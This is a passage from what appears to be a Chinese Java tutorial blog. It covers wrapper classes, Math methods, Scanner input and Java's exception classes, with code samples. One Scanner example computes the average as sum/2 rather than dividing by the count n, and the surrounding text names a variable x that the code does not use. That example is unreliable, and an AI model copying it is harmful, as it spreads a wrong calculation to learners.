从指定的索引处开始，返回第一次出现的指定子字符串在该字符串中的索引。</td></tr><tr><td align="left">7</td><td align="left">int lastIndexOf(String str) 返回最右边出现的指定子字符串在此字符串中的索引。</td></tr><tr><td align="left">8</td><td align="left">int lastIndexOf(String str, int fromIndex) 返回 String 对象中子字符串最后出现的位置。</td></tr><tr><td align="left">9</td><td align="left">int length()  返回长度（字符数）。</td></tr><tr><td align="left">10</td><td align="left">void setCharAt(int index, char ch) 将给定索引处的字符设置为 <code>ch</code>。</td></tr><tr><td align="left">11</td><td align="left">void setLength(int newLength) 设置字符序列的长度。</td></tr><tr><td align="left">12</td><td align="left">CharSequence subSequence(int start, int end) 返回一个新的字符序列，该字符序列是此序列的子序列。</td></tr><tr><td align="left">13</td><td align="left">String substring(int start) 返回一个新的 <code>String</code>，它包含此字符序列当前所包含的字符子序列。</td></tr><tr><td align="left">14</td><td align="left">String substring(int start, int end) 返回一个新的 <code>String</code>，它包含此序列当前所包含的字符子序列。</td></tr><tr><td align="left">15</td><td align="left">String toString() 返回此序列中数据的字符串表示形式。</td></tr></tbody></table><h1 id="Number-amp-Math-类"><a href="#Number-amp-Math-类" class="headerlink" title="Number &amp; Math 类"></a>Number &amp; Math 类</h1><p>一般地，当需要使用数字的时候，我们通常使用内置数据类型，如：<strong>byte、int、long、double</strong> 等。</p><p>然而，在实际开发过程中，我们经常会遇到需要使用对象，而不是内置数据类型的情形。为了解决这个问题，Java 语言为每一个内置数据类型提供了对应的包装类。</p><p>所有的包装类<strong>（Integer、Long、Byte、Double、Float、Short）</strong>都是抽象类 Number 的子类。</p><table><thead><tr><th align="left">包装类</th><th align="left">基本数据类型</th></tr></thead><tbody><tr><td align="left">Boolean</td><td align="left">boolean</td></tr><tr><td align="left">Byte</td><td align="left">byte</td></tr><tr><td align="left">Short</td><td align="left">short</td></tr><tr><td align="left">Integer</td><td align="left">int</td></tr><tr><td align="left">Long</td><td align="left">long</td></tr><tr><td align="left">Character</td><td align="left">char</td></tr><tr><td align="left">Float</td><td align="left">float</td></tr><tr><td align="left">Double</td><td align="left">double</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513172659.png"></p><p>这种由编译器特别支持的包装称为装箱，所以当内置数据类型被当作对象使用的时候，编译器会把内置类型装箱为包装类。相似的，编译器也可以把一个对象拆箱为内置类型。Number 类属于 java.lang 包。</p><p>下面是一个使用 Integer 对象的实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Integer num = <span class="number">6</span> ;</span><br><span class="line">        num++;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513173512.png"></p><p>当 x 被赋为整型值时，由于x是一个对象，所以编译器要对x进行装箱。然后，为了使x能进行加运算，所以要对x进行拆箱。</p><p>编译运行结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513173551.png"></p><h2 id="Math-类"><a href="#Math-类" class="headerlink" title="Math 类"></a>Math 类</h2><p>Java 的 Math 包含了用于执行基本数学运算的属性和方法，如初等指数、对数、平方根和三角函数。</p><p><strong>Math 的方法都被定义为 static 形式，通过 Math 类可以在主函数中直接调用</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;90°的正弦值:&quot;</span> + Math.sin(Math.PI/<span class="number">2</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;0°的余弦值:&quot;</span> + Math.cos(<span class="number">0</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;60°的正切值:&quot;</span> + Math.tan(Math.PI/<span class="number">3</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;1的反正切值:&quot;</span> + Math.atan(<span class="number">1</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;π/2的角度值:&quot;</span> + Math.toDegrees(Math.PI/<span class="number">2</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;π的值为:&quot;</span> + Math.PI);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513174541.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513174643.png"></p><h2 id="Number-amp-Math-类方法"><a href="#Number-amp-Math-类方法" class="headerlink" title="Number &amp; Math 类方法"></a>Number &amp; Math 类方法</h2><p>下面的表中列出的是 Number &amp; Math 类常用的一些方法：</p><table><thead><tr><th align="left">序号</th><th align="left">方法与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/java/number-xxxvalue.html">xxxValue()</a> 将 Number 对象转换为xxx数据类型的值并返回。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/java/number-compareto.html">compareTo()</a> 将number对象与参数比较。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/java/number-equals.html">equals()</a> 判断number对象是否与参数相等。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/java/number-valueof.html">valueOf()</a> 返回一个 Number 对象指定的内置数据类型</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/java/number-tostring.html">toString()</a> 以字符串形式返回值。</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/java/number-parseInt.html">parseInt()</a> 将字符串解析为int类型。</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/java/number-abs.html">abs()</a> 返回参数的绝对值。</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/java/number-ceil.html">ceil()</a> 返回大于等于( &gt;= )给定参数的的最小整数，类型为双精度浮点型。</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/java/number-floor.html">floor()</a> 返回小于等于（&lt;=）给定参数的最大整数 。</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/java/number-rint.html">rint()</a> 返回与参数最接近的整数。返回类型为double。</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/java/number-round.html">round()</a> 它表示<strong>四舍五入</strong>，算法为 **Math.floor(x+0.5)**，即将原来的数字加上 0.5 后再向下取整，所以，Math.round(11.5) 的结果为12，Math.round(-11.5) 的结果为-11。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/java/number-min.html">min()</a> 返回两个参数中的最小值。</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/java/number-max.html">max()</a> 返回两个参数中的最大值。</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/java/number-exp.html">exp()</a> 返回自然数底数e的参数次方。</td></tr><tr><td align="left">15</td><td align="left"><a href="https://www.runoob.com/java/number-log.html">log()</a> 返回参数的自然数底数的对数值。</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/java/number-pow.html">pow()</a> 返回第一个参数的第二个参数次方。</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/java/number-sqrt.html">sqrt()</a> 求参数的算术平方根。</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/java/number-sin.html">sin()</a> 求指定double类型参数的正弦值。</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/java/number-cos.html">cos()</a> 求指定double类型参数的余弦值。</td></tr><tr><td align="left">20</td><td align="left"><a href="https://www.runoob.com/java/number-tan.html">tan()</a> 求指定double类型参数的正切值。</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/java/number-asin.html">asin()</a> 求指定double类型参数的反正弦值。</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/java/number-acos.html">acos()</a> 求指定double类型参数的反余弦值。</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/java/number-atan.html">atan()</a> 求指定double类型参数的反正切值。</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/java/number-atan2.html">atan2()</a> 将笛卡尔坐标转换为极坐标，并返回极坐标的角度值。</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/java/number-todegrees.html">toDegrees()</a> 将参数转化为角度。</td></tr><tr><td align="left">26</td><td align="left"><a href="https://www.runoob.com/java/number-toradians.html">toRadians()</a> 将角度转换为弧度。</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/java/number-random.html">random()</a> 返回一个随机数。</td></tr></tbody></table><h2 id="Math-的-floor-round-和-ceil-方法实例比较"><a href="#Math-的-floor-round-和-ceil-方法实例比较" class="headerlink" title="Math 的 floor,round 和 ceil 方法实例比较"></a>Math 的 floor,round 和 ceil 方法实例比较</h2><table><thead><tr><th align="left">参数</th><th align="left">Math.floor</th><th align="left">Math.round</th><th align="left">Math.ceil</th></tr></thead><tbody><tr><td align="left">1.4</td><td align="left">1</td><td align="left">1</td><td align="left">2</td></tr><tr><td align="left">1.5</td><td align="left">1</td><td align="left">2</td><td align="left">2</td></tr><tr><td align="left">1.6</td><td align="left">1</td><td align="left">2</td><td align="left">2</td></tr><tr><td align="left">-1.4</td><td align="left">-2</td><td align="left">-1</td><td align="left">-1</td></tr><tr><td align="left">-1.5</td><td align="left">-2</td><td align="left">-1</td><td align="left">-1</td></tr><tr><td align="left">-1.6</td><td align="left">-2</td><td align="left">-2</td><td align="left">-1</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">double</span>[] nums = &#123; <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, -<span class="number">1.4</span>, -<span class="number">1.5</span>, -<span class="number">1.6</span> &#125;;   </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">double</span> num : nums) &#123;   </span><br><span class="line">            test(num);   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">double</span> num)</span> </span>&#123;   </span><br><span class="line">        System.out.println(<span class="string">&quot;Math.floor(&quot;</span> + num + <span class="string">&quot;)=&quot;</span> + Math.floor(num));   </span><br><span class="line">        System.out.println(<span class="string">&quot;Math.round(&quot;</span> + num + <span class="string">&quot;)=&quot;</span> + Math.round(num));   </span><br><span class="line">        System.out.println(<span class="string">&quot;Math.ceil(&quot;</span> + num + <span class="string">&quot;)=&quot;</span> + Math.ceil(num));   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513175310.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230513175430.png"></p><h1 id="流-Stream-、文件-File-和IO"><a href="#流-Stream-、文件-File-和IO" class="headerlink" title="流(Stream)、文件(File)和IO"></a>流(Stream)、文件(File)和IO</h1><p>Java.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。</p><p>Java.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。</p><p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p><p>Java 为 I/O 提供了强大的而灵活的支持，使其更广泛地应用到文件传输和网络编程中。</p><h2 id="读取控制台输入"><a href="#读取控制台输入" class="headerlink" title="读取控制台输入"></a>读取控制台输入</h2><p>Java 的控制台输入由 System.in 完成。</p><p>为了获得一个绑定到控制台的字符流，你可以把 System.in 包装在一个 BufferedReader 对象中来创建一个字符流。</p><p>下面是创建 BufferedReader 的基本语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br></pre></td></tr></table></figure><p>BufferedReader 对象创建后，我们便可以使用 read() 方法从控制台读取一个字符，或者用 readLine() 方法读取一个字符串。</p><h1 id="Scanner-类"><a href="#Scanner-类" class="headerlink" title="Scanner 类"></a>Scanner 类</h1><p>java.util.Scanner 是 Java5 的新特征，我们可以通过 Scanner 类来获取用户的输入。</p><p>下面是创建 Scanner 对象的基本语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br></pre></td></tr></table></figure><p>接下来我们演示一个最简单的数据输入，并通过 Scanner 类的 next() 与 nextLine() 方法获取输入的字符串，在读取前我们一般需要 使用 hasNext 与 hasNextLine 判断是否还有输入的数据：</p><h2 id="使用-next-方法："><a href="#使用-next-方法：" class="headerlink" title="使用 next 方法："></a>使用 next 方法：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner data = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="comment">// 从键盘接收数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// next方式接收字符串</span></span><br><span class="line">        System.out.println(<span class="string">&quot;以next方式接收:&quot;</span>);</span><br><span class="line">        <span class="comment">// 判断是否还有输入</span></span><br><span class="line">        <span class="keyword">if</span>(data.hasNext())&#123;</span><br><span class="line">            String str1 = data.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的数据为：&quot;</span> + str1);</span><br><span class="line">        &#125;</span><br><span class="line">        data.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305151513008.png"></p><p>执行以上程序输出结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305151515180.png"></p><p>可以看到 blog 字符串并未输出，接下来我们看 nextLine。</p><h2 id="使用-nextLine-方法："><a href="#使用-nextLine-方法：" class="headerlink" title="使用 nextLine 方法："></a>使用 nextLine 方法：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner data = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="comment">// 从键盘接收数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// nextLine方式接收字符串</span></span><br><span class="line">        System.out.println(<span class="string">&quot;以nextLine方式接收:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是否还有输入</span></span><br><span class="line">        <span class="keyword">if</span>(data.hasNextLine())&#123;</span><br><span class="line">            String str = data.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的数据为:&quot;</span> + str);</span><br><span class="line">        &#125;</span><br><span class="line">        data.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152115640.png"></p><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152113683.png"></p><p>空格后的blog可以被检测到。</p><h2 id="next-与-nextLine-区别"><a href="#next-与-nextLine-区别" class="headerlink" title="next() 与 nextLine() 区别"></a>next() 与 nextLine() 区别</h2><p>next():</p><ul><li>1、一定要读取到有效字符后才可以结束输入。</li><li>2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。</li><li>3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。</li><li><strong>next() 不能得到带有空格的字符串</strong>。</li></ul><p>nextLine()：</p><ul><li>1、以Enter为结束符,也就是说 <strong>nextLine()方法返回的是输入回车之前的所有字符</strong>。</li><li>2、<strong>可以获得空白</strong>。</li></ul><p>如果要输入 int 或 float 类型的数据，在 Scanner 类中也有支持，但是在输入之前最好先使用 hasNextXxx() 方法进行验证，再使用 nextXxx() 来读取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="comment">// 从键盘接收数据</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">float</span> f = <span class="number">0.0f</span>;</span><br><span class="line">        System.out.print(<span class="string">&quot;输入整数：&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scan.hasNextInt()) &#123;</span><br><span class="line">            <span class="comment">// 判断输入的是否是整数</span></span><br><span class="line">            i = scan.nextInt();</span><br><span class="line">            <span class="comment">// 接收整数</span></span><br><span class="line">            System.out.println(<span class="string">&quot;整数数据：&quot;</span> + i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 输入错误的信息</span></span><br><span class="line">            System.out.println(<span class="string">&quot;输入的不是整数！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;输入小数：&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scan.hasNextFloat()) &#123;</span><br><span class="line">            <span class="comment">// 判断输入的是否是小数</span></span><br><span class="line">            f = scan.nextFloat();</span><br><span class="line">            <span class="comment">// 接收小数</span></span><br><span class="line">            System.out.println(<span class="string">&quot;小数数据：&quot;</span> + f);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 输入错误的信息</span></span><br><span class="line">            System.out.println(<span class="string">&quot;输入的不是小数！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        scan.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152122437.png"></p><p>结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152120492.png"></p><p>以下实例我们可以输入多个数字，并求其总和与平均数，每输入一个数字用回车确认，通过输入非数字来结束输入并输出执行结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入数字：&quot;</span>);</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(scan.hasNextDouble())&#123;</span><br><span class="line">            <span class="keyword">double</span> x = scan.nextDouble();</span><br><span class="line">            n++;</span><br><span class="line">            sum+=x;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(n + <span class="string">&quot;个数的和为：&quot;</span> + sum);</span><br><span class="line">        System.out.println(n + <span class="string">&quot;个数的平均值为：&quot;</span> + (sum/<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152132192.png"></p><p>结果如下（输入非数字来结束输入）：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152131523.png"></p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>异常是程序中的一些错误，但并不是所有的错误都是异常，并且错误有时候是可以避免的。</p><p>比如说，你的代码少了一个分号，那么运行出来结果是提示是错误 java.lang.Error；如果你用System.out.println(11/0)，那么你是因为你用0做了除数，会抛出 java.lang.ArithmeticException 的异常。</p><p>异常发生的原因有很多，通常包含以下几大类：</p><ul><li>用户输入了非法数据。</li><li>要打开的文件不存在。</li><li>网络通信时连接中断，或者JVM内存溢出。</li></ul><p>这些异常有的是因为用户错误引起，有的是程序错误引起的，还有其它一些是因为物理错误引起的。-</p><p>要理解Java异常处理是如何工作的，你需要掌握以下三种类型的异常：</p><ul><li><strong>检查性异常：</strong>最具代表的检查性异常是用户错误或问题引起的异常，这是程序员无法预见的。例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。</li><li><strong>运行时异常：</strong> 运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。</li><li><strong>错误：</strong> 错误不是异常，而是脱离程序员控制的问题。错误在代码中通常被忽略。例如，当栈溢出时，一个错误就发生了，它们在编译也检查不到的。</li></ul><h2 id="Exception-类的层次"><a href="#Exception-类的层次" class="headerlink" title="Exception 类的层次"></a>Exception 类的层次</h2><p>所有的异常类是从 java.lang.Exception 类继承的子类。</p><p>Exception 类是 Throwable 类的子类。除了Exception类外，Throwable还有一个子类Error 。</p><p>Java 程序通常不捕获错误。错误一般发生在严重故障时，它们在Java程序处理的范畴之外。</p><p>Error 用来指示运行时环境发生的错误。</p><p>例如，JVM 内存溢出。一般地，程序不会从错误中恢复。</p><p>异常类有两个主要的子类：IOException 类和 RuntimeException 类。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305152155362.png"></p><p>在 Java 内置类中，有大部分常用检查性和非检查性异常。</p><h2 id="Java-内置异常类"><a href="#Java-内置异常类" class="headerlink" title="Java 内置异常类"></a>Java 内置异常类</h2><p>Java 语言定义了一些异常类在 java.lang 标准包中。</p><p>标准运行时异常类的子类是最常见的异常类。由于 <strong>java.lang 包是默认加载到所有的 Java 程序的</strong>，所以<strong>大部分</strong>从运行时异常类继承而来的异常都<strong>可以直接使用</strong>。</p><p>Java 根据各个类库也定义了一些其他的异常，下面的表中列出了 <strong>Java 的非检查性异常</strong>。</p><table><thead><tr><th align="left"><strong>异常</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">ArithmeticException</td><td align="left">当出现异常的运算条件时，抛出此异常。例如，一个整数”除以零”时，抛出此类的一个实例。</td></tr><tr><td align="left">ArrayIndexOutOfBoundsException</td><td align="left">用非法索引访问数组时抛出的异常。如果索引为负或大于等于数组大小，则该索引为非法索引。</td></tr><tr><td align="left">ArrayStoreException</td><td align="left">试图将错误类型的对象存储到一个对象数组时抛出的异常。</td></tr><tr><td align="left">ClassCastException</td><td align="left">当试图将对象强制转换为不是实例的子类时，抛出该异常。</td></tr><tr><td align="left">IllegalArgumentException</td><td align="left">抛出的异常表明向方法传递了一个不合法或不正确的参数。</td></tr><tr><td align="left">IllegalMonitorStateException</td><td align="left">抛出的异常表明某一线程已经试图等待对象的监视器，或者试图通知其他正在等待对象的监视器而本身没有指定监视器的线程。</td></tr><tr><td align="left">IllegalStateException</td><td align="left">在非法或不适当的时间调用方法时产生的信号。换句话说，即 Java 环境或 Java 应用程序没有处于请求操作所要求的适当状态下。</td></tr><tr><td align="left">IllegalThreadStateException</td><td align="left">线程没有处于请求操作所要求的适当状态时抛出的异常。</td></tr><tr><td align="left">IndexOutOfBoundsException</td><td align="left">指示某排序索引（例如对数组、字符串或向量的排序）超出范围时抛出。</td></tr><tr><td align="left">NegativeArraySizeException</td><td align="left">如果应用程序试图创建大小为负的数组，则抛出该异常。</td></tr><tr><td align="left">NullPointerException</td><td align="left">当应用程序试图在需要对象的地方使用 <code>null</code> 时，抛出该异常</td></tr><tr><td align="left">NumberFormatException</td><td align="left">当应用程序试图将字符串转换成一种数值类型，但该字符串不能转换为适当格式时，抛出该异常。</td></tr><tr><td align="left">SecurityException</td><td align="left">由安全管理器抛出的异常，指示存在安全侵犯。</td></tr><tr><td align="left">StringIndexOutOfBoundsException</td><td align="left">此异常由 <code>String</code> 方法抛出，指示索引或者为负，或者超出字符串的大小。</td></tr><tr><td align="left">UnsupportedOperationException</td><td align="left">当不支持请求的操作时，抛出该异常。</td></tr></tbody></table><p>下面的表中列出了 Java 定义在 java.lang 包中的<strong>检查性异常类</strong>。</p><table><thead><tr><th align="left"><strong>异常</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">ClassNotFoundException</td><td align="left">应用程序试图加载类时，找不到相应的类，抛出该异常。</td></tr><tr><td align="left">CloneNotSupportedException</td><td align="left">当调用 <code>Object</code> 类中的 <code>clone</code> 方法克隆对象，但该对象的类无法实现 <code>Cloneable</code> 接口时，抛出该异常。</td></tr><tr><td align="left">IllegalAccessException</td><td align="left">拒绝访问一个类的时候，抛出该异常。</td></tr><tr><td align="left">InstantiationException</td><td align="left">当试图使用 <code>Class</code> 类中的 <code>newInstance</code> 方法创建一个类的实例，而指定的类对象因为是一个接口或是一个抽象类而无法实例化时，抛出该异常。</td></tr><tr><td align="left">InterruptedException</td><td align="left">一个线程被另一个线程中断，抛出该异常。</td></tr><tr><td align="left">NoSuchFieldException</td><td align="left">请求的变量不存在</td></tr><tr><td align="left">NoSuchMethodException</td><td align="left">请求的方法不存在</td></tr></tbody></table><h2 id="异常方法"><a href="#异常方法" class="headerlink" title="异常方法"></a>异常方法</h2><p>下面的列表是 <strong>Throwable 类</strong>的主要方法:</p><table><thead><tr><th 